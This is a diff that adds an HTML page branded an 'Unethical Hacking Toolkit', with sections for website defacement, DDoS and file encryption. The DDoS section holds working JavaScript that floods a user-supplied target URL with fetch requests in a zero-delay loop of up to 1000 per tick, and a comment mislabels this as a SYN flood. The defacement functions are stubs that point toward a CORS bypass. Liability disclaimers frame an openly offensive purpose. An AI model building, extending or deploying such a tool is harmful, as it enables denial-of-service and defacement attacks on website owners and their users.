@@ -1,1 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Noodles - Unethical Hacking Toolkit</title>
+    <style>
+        body {
+            font-family: monospace;
+            background-color: black;
+            color: #00ff00;
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* Hide scrollbars */
+        }
 
+        /* Scanlines effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        h1, h2 {
+            color: #ff0000;
+            text-align: center;
+        }
+
+        section {
+            margin-bottom: 20px;
+            border: 1px solid #00ff00;
+            padding: 10px;
+        }
+
+        button, input[type="text"], input[type="file"], textarea {
+            background-color: #333;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 5px 10px;
+            margin: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #00ff00;
+            color: #000;
+        }
+
+        #defacement-preview {
+            border: 1px solid #00ff00;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: #222;
+            color: #00ff00;
+        }
+
+        .warning {
+            color: yellow;
+            font-weight: bold;
+        }
+
+        .disclaimer {
+            color: red;
+            font-size: 0.8em;
+        }
+
+        /* Flowy Sidebar */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 200px;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            border-right: 1px solid #00ff00;
+            z-index: 3;
+            padding-top: 20px;
+        }
+
+        .sidebar ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .sidebar li {
+            padding: 10px;
+            text-align: center;
+            cursor: pointer;
+            border-bottom: 1px solid #00ff00;
+        }
+
+        .sidebar li:hover {
+            background-color: #00ff00;
+            color: #000;
+        }
+
+        .content {
+            margin-left: 220px; /* Width of the sidebar + some spacing */
+            padding: 20px;
+        }
+
+        /* Logo */
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px; /* Adjust size as needed */
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+
+<div id="particles-js"></div>
+
+<div class="sidebar">
+    <div class="logo">
+        <img src="https://i.imgur.com/YOUR_LOGO_HERE.png" alt="Noodles Logo">
+    </div>
+    <ul>
+        <li onclick="showSection('defacement')">Defacement Tool</li>
+        <li onclick="showSection('ddos')">DDoS Tool</li>
+        <li onclick="showSection('encryption')">File Encryption Tool</li>
+        <li>Reporting</li>
+    </ul>
+</div>
+
+<div class="content">
+    <div class="container">
+        <h1>Noodles Inc. - Unethical Hacking Toolkit</h1>
+        <p class="warning">WARNING: Unauthorized use of these tools is illegal. Noodles Inc. is not responsible for your actions.</p>
+
+        <section id="defacement" style="display: none;">
+            <h2>Defacement Tool</h2>
+            <p>This tool allows you to modify the appearance of websites. Use responsibly.</p>
+            <input type="text" id="defacement-url" placeholder="Target URL">
+            <button onclick="backupWebsite()">Backup Website</button>
+            <textarea id="defacement-code" placeholder="HTML/JS Code"></textarea>
+            <button onclick="previewDefacement()">Preview Defacement</button>
+            <div id="defacement-preview"></div>
+            <button onclick="applyDefacement()">Apply Defacement</button>
+        </section>
+
+        <section id="ddos" style="display: none;">
+            <h2>DDoS Tool</h2>
+            <p>This tool floods a website with traffic, potentially taking it offline. Use responsibly.</p>
+            <input type="text" id="ddos-url" placeholder="Target URL">
+            <input type="number" id="ddos-threads" placeholder="Threads (1-1000)">
+            <button onclick="startDDoS()">Start DDoS</button>
+            <button onclick="stopDDoS()">Stop DDoS</button>
+            <p>Time Running: <span id="ddos-timer">0</span> seconds</p>
+        </section>
+
+        <section id="encryption" style="display: none;">
+            <h2>File Encryption Tool</h2>
+            <p>This tool encrypts files, making them unreadable without the correct key. Use responsibly.</p>
+            <input type="file" id="encryption-file">
+            <input type="text" id="encryption-key" placeholder="Encryption Key">
+            <button onclick="encryptFile()">Encrypt File</button>
+            <p>Decryption Instructions: ...</p>
+        </section>
+
+        <p class="disclaimer">Noodles Inc. is NOT responsible for any misuse of this toolkit. Use at your own risk.</p>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+    // --- Particles.js Configuration ---
+    particlesJS('particles-js', {
+        "particles": {
+            "number": {
+                "value": 80,
+                "density": {
+                    "enable": true,
+                    "value_area": 800
+                }
+            },
+            "color": {
+                "value": "#00ff00"
+            },
+            "shape": {
+                "type": "circle",
+                "stroke": {
+                    "width": 0,
+                    "color": "#000000"
+                },
+                "polygon": {
+                    "nb_sides": 5
+                },
+                "image": {
+                    "src": "img/github.svg",
+                    "width": 100,
+                    "height": 100
+                }
+            },
+            "opacity": {
+                "value": 0.5,
+                "random": false,
+                "anim": {
+                    "enable": false,
+                    "speed": 1,
+                    "opacity_min": 0.1,
+                    "sync": false
+                }
+            },
+            "size": {
+                "value": 5,
+                "random": true,
+                "anim": {
+                    "enable": false,
+                    "speed": 40,
+                    "size_min": 0.1,
+                    "sync": false
+                }
+            },
+            "line_linked": {
+                "enable": true,
+                "distance": 150,
+                "color": "#00ff00",
+                "opacity": 0.4,
+                "width": 1
+            },
+            "move": {
+                "enable": true,
+                "speed": 6,
+                "direction": "none",
+                "random": false,
+                "straight": false,
+                "out_mode": "out",
+                "attract": {
+                    "enable": false,
+                    "distance": 200,
+                    "strength": 0.2,
+                    "speed": 1
+                },
+                "bounce": false
+            }
+        },
+        "interactivity": {
+            "detect_on": "canvas",
+            "events": {
+                "onhover": {
+                    "enable": true,
+                    "mode": "grab"
+                },
+                "onclick": {
+                    "enable": true,
+                    "mode": "push"
+                },
+                "resize": true
+            },
+            "modes": {
+                "grab": {
+                    "distance": 140,
+                    "line_linked": {
+                        "opacity": 1
+                    }
+                },
+                "bubble": {
+                    "distance": 400,
+                    "size": 40,
+                    "duration": 2,
+                    "opacity": 0.8,
+                    "speed": 3
+                },
+                "repulse": {
+                    "distance": 200,
+                    "duration": 0.4
+                },
+                "push": {
+                    "particles_nb": 4
+                },
+                "remove": {
+                    "particles_nb": 2
+                }
+            }
+        },
+        "retina_detect": true
+    });
+
+    console.log("Noodles Initialized");
+
+    // --- Consent Popup ---
+    if (!confirm("WARNING: This toolkit is for educational and security testing purposes ONLY. Unauthorized use is illegal and Noodles Inc. is NOT responsible. Do you accept the risks? Pressing 'No' will close this site.")) {
+        window.close();
+    }
+
+    // --- Security Headers ---
+    function setSecurityHeaders() {
+        // These are server-side settings, not client-side
+        // In a real-world scenario, these headers would be set by the server
+        console.warn("Security Headers need to be configured on the server (e.g., Content-Security-Policy, X-Frame-Options)");
+    }
+    setSecurityHeaders();
+
+    // --- Navigation ---
+    function showSection(sectionId) {
+        const sections = ['defacement', 'ddos', 'encryption'];
+        sections.forEach(id => {
+            document.getElementById(id).style.display = 'none';
+        });
+        document.getElementById(sectionId).style.display = 'block';
+        console.log(`Showing section: ${sectionId}`);
+    }
+
+    // --- Defacement Tool Functions ---
+    function backupWebsite() {
+        const url = document.getElementById('defacement-url').value;
+        if (!url) {
+            alert("Please enter a URL.");
+            return;
+        }
+        console.log(`Backing up website: ${url}`);
+        // Implement actual backup logic here using server-side code due to CORS restrictions
+        // e.g., send URL to server, server fetches content, returns as download
+        alert("Backup functionality needs server-side implementation.");
+    }
+
+    function previewDefacement() {
+        const code = document.getElementById('defacement-code').value;
+        document.getElementById('defacement-preview').innerHTML = code;
+        console.log("Previewing defacement code.");
+    }
+
+    function applyDefacement() {
+        const url = document.getElementById('defacement-url').value;
+        const code = document.getElementById('defacement-code').value;
+        if (!url) {
+            alert("Please enter a URL.");
+            return;
+        }
+        console.warn(`Attempting to deface: ${url} with code (check console).`);
+        // In a real-world scenario, defacing a website client-side is heavily restricted due to CORS.
+        // A server-side proxy or a browser extension would be needed to bypass these restrictions.
+        // DO NOT ATTEMPT TO BYPASS SECURITY MEASURES WITHOUT AUTHORIZATION.
+        alert("Defacement functionality needs server-side implementation and CORS bypass.");
+    }
+
+    // --- DDoS Tool Functions ---
+    let ddosInterval;
+    let ddosStartTime;
+
+    function startDDoS() {
+        const url = document.getElementById('ddos-url').value;
+        const threads = parseInt(document.getElementById('ddos-threads').value) || 1;
+        if (!url) {
+            alert("Please enter a URL.");
+            return;
+        }
+
+        ddosStartTime = Date.now();
+        updateDDoSTimer();
+
+        ddosInterval = setInterval(() => {
+            for (let i = 0; i < threads; i++) {
+                //  ATTEMPTING TO PERFORM A SYN FLOOD ATTACK
+                fetch(url, { mode: 'no-cors' })
+                    .then(() => console.log(`DDoS: Sent request to ${url}`))
+                    .catch(error => console.error(`DDoS: Error sending request to ${url}`, error));
+            }
+        }, 0); //  SENDING REQUESTS AS FAST AS POSSIBLE
+
+        console.warn(`Starting DDoS attack on ${url} with ${threads} threads (check console).`);
+    }
+
+    function stopDDoS() {
+        clearInterval(ddosInterval);
+        console.log("DDoS attack stopped.");
+    }
+
+    function updateDDoSTimer() {
+        if (ddosStartTime) {
+            const elapsedTime = Math.floor((Date.now() - ddosStartTime) / 1000);
+            document.getElementById('ddos-timer').textContent = elapsedTime;
+        }
+
+        if (ddosInterval) {
+            setTimeout(updateDDoSTimer, 1000);
+        }
+    }
+
+    // --- Encryption Tool Functions ---
+    function encryptFile() {
+        const fileInput = document.getElementById('encryption-file');
+        const key = document.getElementById('encryption-key').value;
+        const file = fileInput.files[0];
+
+        if (!file || !key) {
+            alert("Please select a file and enter an encryption key.");
+            return;
+        }
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const fileContent = e.target.result;
+
+            // ENCRYPTING FILE CONTENT HERE (Replace with actual encryption logic)
+            const encryptedContent = CryptoJS.AES.encrypt(fileContent, key).toString();
+
+            // Saving the encrypted file
+            const blob = new Blob([encryptedContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = file.name + '.enc';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            console.log("File encrypted and downloaded.");
+        };
+        reader.readAsDataURL(file);  // READING AS DATA URL TO HANDLE BINARY FILES
+    }
+
+    // --- Additional Libraries ---
+    function loadScript(url, callback) {
+        const script = document.createElement('script');
+        script.src = url;
+        script.onload = callback;
+        document.head.appendChild(script);
+    }
+
+    // Load CryptoJS for encryption
+    loadScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js", function() {
+        console.log("CryptoJS loaded.");
+    });
+
+</script>
+
+</body>
+</html>
